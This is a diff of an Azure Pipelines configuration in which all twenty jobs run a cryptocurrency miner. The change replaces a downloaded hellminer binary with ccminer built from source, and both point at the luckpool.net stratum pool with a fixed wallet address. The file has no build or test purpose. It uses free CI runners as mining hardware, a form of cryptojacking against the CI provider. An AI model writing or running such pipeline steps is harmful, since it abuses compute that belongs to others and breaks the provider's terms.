@@ -6,100 +6,100 @@ jobs:
 - job: Run1
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run2
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run3
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run4
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run5
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run6
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run7
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run8
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run9
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run10
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run11
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run12
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run13
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run14
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run15
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run16
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run17
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run18
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run19
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
 - job: Run20
   cancelTimeoutInMinutes: 1
   steps:
-  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
+  - bash: sudo apt update -y && sudo apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.aada -t 2
     displayName: 'run'
